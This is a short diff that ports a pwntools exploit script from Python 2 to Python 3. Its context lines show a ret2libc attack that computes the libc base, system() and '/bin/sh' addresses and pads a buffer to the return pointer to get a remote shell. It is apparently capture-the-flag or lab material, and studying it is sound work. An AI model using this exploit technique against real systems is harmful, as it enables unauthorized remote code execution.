@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-#-*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 
 from pwn import *
 from struct import *
@@ -37,9 +37,9 @@ libc_base = puts_addr - puts_off        # calculate libc base address
 system = libc_base + system_off         # calculate system address
 bin_sh = libc_base + bin_sh_off         # calculate "/bin/sh" address
 
-print "[+] libc base at: 0x%08x" % libc_base
-print "[+] system() at: 0x%08x" % system
-print "[+] /bin/sh at: 0x%08x" % bin_sh
+print("[+] libc base at: 0x%08x" % libc_base)
+print("[+] system() at: 0x%08x" % system)
+print("[+] /bin/sh at: 0x%08x" % bin_sh)
 
 # buffer to get remote shell
 buf_rce = "A" * offset                  # padding to RIP's offset
